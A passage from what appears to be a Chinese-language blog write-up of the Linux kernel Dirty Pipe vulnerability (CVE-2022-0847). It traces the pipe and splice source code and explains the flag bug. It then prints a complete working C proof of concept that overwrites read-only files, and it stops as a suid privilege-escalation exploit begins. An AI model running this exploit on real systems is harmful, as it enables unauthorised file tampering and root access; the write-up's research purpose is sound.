class="comment"> * 且我们已释放了锁。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ERESTARTSYS;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line">wake_next_reader = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))</span><br><span class="line">wake_next_reader = <span class="literal">false</span>;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (was_full)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line"><span class="keyword">if</span> (wake_next_reader)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">file_accessed(filp);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以总结：对于一个刚刚建立的管道，其 buffer 数组其实并没有分配对应的页面空间，也没有设置标志位；在我们向管道内写入数据时会通过 buddy system 为对应 buffer 分配新的页框，<strong>并设置 PIPE_BUF_FLAG_CAN_MERGE 标志位，标志该 buffer 可以进行写入</strong>；而当我们从管道中读出数据之后，纵使一个 buffer 对应的 page 上的数据被读完了，我们也不会释放该 page，而可以也会直接投入到下一次使用中，<strong>因此会保留 PIPE_BUF_FLAG_CAN_MERGE 标志位</strong></p><h2 id="splice：文件与管道间数据拷贝"><a href="#splice：文件与管道间数据拷贝" class="headerlink" title="splice：文件与管道间数据拷贝"></a>splice：文件与管道间数据拷贝</h2><p>当我们想要将一个文件的数据拷贝到另一个文件时，比较朴素的一种想法是打开两个文件后将源文件数据读入后再写入目标文件，但这样的做法需要在用户空间与内核空间之间来回进行数据拷贝，<strong>具有可观的开销</strong></p><p>因此为了减少这样的开销， <code>splice</code>这一个非常独特的系统调用应运而生，其作用是<strong>在文件与管道之间进行数据拷贝</strong>，以此<strong>将内核空间与用户空间之间的数据拷贝转变为内核空间内的数据拷贝，从而避免了数据在用户空间与内核空间之间的拷贝造成的开销</strong></p><p>glibc 中的 wrapper 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice</span><span class="params">(<span class="type">int</span> fd_in, <span class="type">loff_t</span> *off_in, <span class="type">int</span> fd_out,</span></span><br><span class="line"><span class="params">               <span class="type">loff_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure><p>splice 系统调用<strong>本质上是利用管道在内核空间中进行数据拷贝</strong>，毫无疑问的是，管道是一个十分好用的内核缓冲区，于是 splice 系统调用选择使用管道作为中间的数据缓冲区</p><p>当你想要将数据从一个文件描述符拷贝到另一个文件描述符中，只需要先创建一个管道，之后使用 splice 系统调用将数据从源文件描述符拷贝到管道中、再使用 splice 系统调用将数据从管道中拷贝到目的文件描述符即可。这样的设计使得我们只需要两次系统调用便能完成数据在不同文件描述符间的拷贝工作，且<strong>数据的拷贝都在内核空间中完成，极大地减少了开销</strong></p><p>splice 系统调用正式操作前都是一些基础的检查工作，这一块不深入分析，存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_splice()// 检查文件描述符是否可用</span><br><span class="line">__do_splice()// 检查是否入设置了偏移或出设置了偏移（任一则返回）</span><br><span class="line">do_splice()// 分流</span><br></pre></td></tr></table></figure><p>最终文件与管道间的分流发生在 <code>do_splice()</code> 函数：</p><ul><li>从管道读取到管道，调用 <code>splice_pipe_to_pipe()</code></li><li>从文件读取到管道，调用 <code>splice_file_to_pipe()</code></li><li>从管道读取到文件，调用 <code>do_splice_from()</code></li></ul><h3 id="从文件读取到管道"><a href="#从文件读取到管道" class="headerlink" title="从文件读取到管道"></a>从文件读取到管道</h3><p>从文件读取数据到管道的核心原理是：<strong>将 pipe_buffer 对应的 page 设置为文件映射的 page</strong></p><p>存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">splice_file_to_pipe()</span><br><span class="line">do_splice_to()</span><br></pre></td></tr></table></figure><p>在 <code>do_splice_to</code> 中最终会调用到内核文件结构体函数表的 <code>splice_read</code> 指针，对于不同的文件系统而言该函数指针不同，以 ext4 文件系统为例，查表 <code>ext4_file_operations</code>，对应调用的函数应为 <code>generic_file_splice_read</code>，存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">generic_file_splice_read()</span><br><span class="line">    call_read_iter()</span><br></pre></td></tr></table></figure><p>该函数是文件函数表中 <code>read_iter()</code> 的 wrapper，对 ext4 而言对应调用 <code>ext4_file_read_iter</code>，源码比较多，这里只贴出核心调用链，最终调用到核心函数是 <code>filemap_read()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ext4_file_read_iter()</span><br><span class="line">    generic_file_read_iter()</span><br><span class="line">    filemap_read()</span><br><span class="line">    filemap_get_pages()<span class="comment">// 获取到文件对应映射的页面集</span></span><br><span class="line">    copy_page_to_iter()<span class="comment">// 进行页面拷贝（单位为单个页面）</span></span><br><span class="line">    __copy_page_to_iter()</span><br><span class="line">    copy_page_to_iter_pipe()<span class="comment">// 我们是管道，所以走入该分支</span></span><br></pre></td></tr></table></figure><p>最终在 <code>copy_page_to_iter_pipe()</code> 中，将对应的 <code>pipe_buffer-&gt;page</code> 设为<strong>文件映射的页面集的对应页框</strong>，将页框引用计数 + 1（<code>get_page()</code>），这样就完成了一个<strong>从文件读取数据到管道的过程</strong>，因为是直接建立页面的映射，所以每次操作后都会将 head +1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="type">size_t</span> off;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sanity(i))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们注意到——该操作<strong>缺失了对 pipe_buffer-&gt;flags 的重新赋值操作</strong></p><h3 id="从管道读取到文件"><a href="#从管道读取到文件" class="headerlink" title="从管道读取到文件"></a>从管道读取到文件</h3><p><code>do_splice_from</code> 最终会调用对应内核文件结构的函数表中的 <code>splice_write()</code> 指针，将 pipe_buffer 数组对应页面上内容读出，写入到文件中，对于不同的文件系统而言该函数指针不同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to initiate a splice from pipe to file.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_splice_from</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="keyword">struct</span> file *out,</span></span><br><span class="line"><span class="params">   <span class="type">loff_t</span> *ppos, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!out-&gt;f_op-&gt;splice_write))</span><br><span class="line"><span class="keyword">return</span> warn_unsupported(out, <span class="string">&quot;write&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以 ext4 文件系统为例，最终会调用到 <code>iter_file_splice_write</code> 函数，之后存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iter_file_splice_write(）</span><br><span class="line">splice_from_pipe_next()// 检查管道可用性</span><br><span class="line">vfs_iter_write()// 读出管道数据写入文件</span><br><span class="line">do_iter_write()</span><br><span class="line">do_iter_readv_writev()</span><br><span class="line">call_write_iter // 上层传入type为 WRITE，走入该分支</span><br></pre></td></tr></table></figure><p><code>call_write_iter</code> 是文件函数表中 <code>write_iter()</code> 的 wrapper，对 ext4 而言对应调用 <code>ext4_file_write_iter</code>，这里最终只是常规的将 buf 上数据拷贝到文件上的操作，也并非本篇的重点，就不展开分析了</p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>我们咋一看好像并没有什么问题，但让我们思考这样一个情景：</p><ul><li>我们将管道整个读写了一轮，此时所有的 pipe_buffer 都保留了 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位</li><li>我们利用 splice 将数据从文件读取一个字节到管道上，此时 pipe_buffer 对应的 page 成员<strong>指向文件映射的页面</strong>，但在 splice 中<strong>并未清空 pipe_buffer 的标志位，从而让内核误以为该页面可以被写入</strong></li><li>在 splice 中建立完页面映射后，此时 head 会指向下一个 pipe_buffer，此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，从而<strong>将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面</strong>，由于 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 仍保留着，因此<strong>内核会误以为该页面可以被写入</strong>，从而完成了越权写入文件的操作</li></ul><p>漏洞点便是在于 splice 系统调用中<strong>未清空</strong> <code>pipe_buffer</code> <strong>的标志位，从而将管道页面可写入的状态保留了下来</strong>，这给了我们越权写入只读文件的操作</p><p>我们不难发现这个漏洞与脏牛十分类似，都是能越权对文件进行写入，不同的是脏牛需要去撞条件竞争的概率，而该漏洞<strong>可以稳定触发</strong>，但是脏牛可以直接写整个文件，而<strong>该漏洞不能在管道边界上写入</strong></p><blockquote><p>当然，如果这个文件甚至都是不可读的，那自然是没法利用的（笑），但在主流 Linux 发行版中有着大量的可作为我们攻击目标的文件，例如 suid 程序或 <code>/etc/passwd</code> 等</p></blockquote><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>漏洞利用的步骤其实我们在前面都已经叙述得差不多了，主要就是分三步走：</p><h2 id="Step-I-写、读管道，设置-PIPE-BUF-FLAG-CAN-MERGE-flag"><a href="#Step-I-写、读管道，设置-PIPE-BUF-FLAG-CAN-MERGE-flag" class="headerlink" title="Step.I 写、读管道，设置 PIPE_BUF_FLAG_CAN_MERGE flag"></a>Step.I 写、读管道，设置 PIPE_BUF_FLAG_CAN_MERGE flag</h2><p>为了保证利用能够稳定成功，我们首先新建一个管道，<strong>将管道写满后再将所有数据读出</strong>，这样管道的每一个 <code>pipe_buffer</code> 都会被设置上  <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位</p><h2 id="Step-II-splice-建立-pipe-buffer-与文件的关联（漏洞产生点）"><a href="#Step-II-splice-建立-pipe-buffer-与文件的关联（漏洞产生点）" class="headerlink" title="Step.II splice 建立 pipe_buffer 与文件的关联（漏洞产生点）"></a>Step.II splice 建立 pipe_buffer 与文件的关联（漏洞产生点）</h2><p>接下来我们使用 splice 系统调用将数据从目标文件中读入到管道，从而让 <code>pipe_buffer-&gt;page</code> 变为文件在内存中映射的页面，为了让下一次写入数据时写回文件映射的页面，我们应当<strong>读入不多于一个数据的页面</strong>，这里笔者选择读入 1 个字节，这样我们仍能向文件上写入将近一张页面的数据</p><p>当我们完成读入之后，管道的 head 指向下一个 pipe_buffer，因此我们若要写入文件则应当走入到 pipe_write 开头写入上一个 pipe_buffer 的分支，这也是为什么我们在这里只读入一个字节的缘故</p><h2 id="Step-III-向管道中写入恶意数据，完成越权写入文件"><a href="#Step-III-向管道中写入恶意数据，完成越权写入文件" class="headerlink" title="Step.III 向管道中写入恶意数据，完成越权写入文件"></a>Step.III 向管道中写入恶意数据，完成越权写入文件</h2><p>接下来<strong>我们直接向管道中写入数据就能完成对只读文件的越权写入</strong>。在 splice 中建立完页面映射后，此时 head 会指向下一个 pipe_buffer，此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，从而<strong>将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面</strong>，由于 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 仍保留着，因此<strong>内核会误以为该页面可以被写入</strong>，从而完成了越权写入文件的操作</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>我们使用 qemu 起一个测试环境，看看是否能够利用该漏洞对只读文件进行写入，最终的 poc 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * POC of CVE-2022-0847</span></span><br><span class="line"><span class="comment"> * written by arttnba3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span>page_size;</span><br><span class="line"><span class="type">size_t</span>offset_in_file;</span><br><span class="line"><span class="type">size_t</span> data_size;</span><br><span class="line"><span class="type">int</span> target_file_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">target_file_stat</span>;</span></span><br><span class="line"><span class="type">int</span>pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> pipe_size;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">// checking before we start to exploit</span></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Usage: ./exp target_file offset_in_file data&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">offset_in_file = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (offset_in_file % page_size == <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Cannot write on the boundary of a page!&quot;</span>);</span><br><span class="line"></span><br><span class="line">target_file_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (target_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Failed to open the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fstat(target_file_fd, &amp;target_file_stat))</span><br><span class="line">errExit(<span class="string">&quot;Failed to get the info of the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (offset_in_file &gt; target_file_stat.st_size)</span><br><span class="line">errExit(<span class="string">&quot;Offset is not in the file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">data_size = <span class="built_in">strlen</span>(argv[<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">if</span> ((offset_in_file + data_size) &gt; target_file_stat.st_size)</span><br><span class="line">errExit(<span class="string">&quot;Cannot enlarge the file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((offset_in_file % page_size) + data_size) &gt; page_size)</span><br><span class="line">errExit(<span class="string">&quot;Cannot write accross a page!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit now...</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span></span><br><span class="line"><span class="comment"> * Just write and read through</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">pipe_size = fcntl(pipe_fd[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">buffer = (<span class="type">char</span>*) <span class="built_in">malloc</span>(page_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= write(pipe_fd[<span class="number">1</span>], buffer, per_write);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= read(pipe_fd[<span class="number">0</span>], buffer, per_read);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use the splice to make the pipe_buffer-&gt;page</span></span><br><span class="line"><span class="comment"> * become the page of the file mapped, by read</span></span><br><span class="line"><span class="comment"> * a byte from the file accross the splice</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);</span><br><span class="line">offset_in_file--;<span class="comment">// we read a byte, so offset should minus 1</span></span><br><span class="line">retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;splice failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;short splice!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Now it comes to the time of exploit:</span></span><br><span class="line"><span class="comment"> * the mapped page of file has been in pipe_buffer,</span></span><br><span class="line"><span class="comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span></span><br><span class="line"><span class="comment"> * just a simple write can make the exploit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">retval = write(pipe_fd[<span class="number">1</span>], argv[<span class="number">3</span>], data_size);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Write failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval &lt; data_size)</span><br><span class="line">errExit(<span class="string">&quot;Short write!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，发现我们成功地覆写了只读文件</p><p><img src="https://s2.loli.net/2022/03/12/vOGZw2Qt9VRsYDd.png" alt="image.png"></p><h1 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03.提权"></a>0x03.提权</h1><p>漏洞的利用形式与“脏牛”基本上是一样的：覆写 <code>/etc/passwd</code> 或者覆写一些 suid 程序进行提权，这里就不过多赘叙了</p><h2 id="suid-提权"><a href="#suid-提权" class="headerlink" title="suid 提权"></a>suid 提权</h2><p>笔者现给出一个修改指定 suid 程序进行提权的 exp，使用 msfvenom 生成运行 <code>/bin/sh</code> 的 shellcode：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 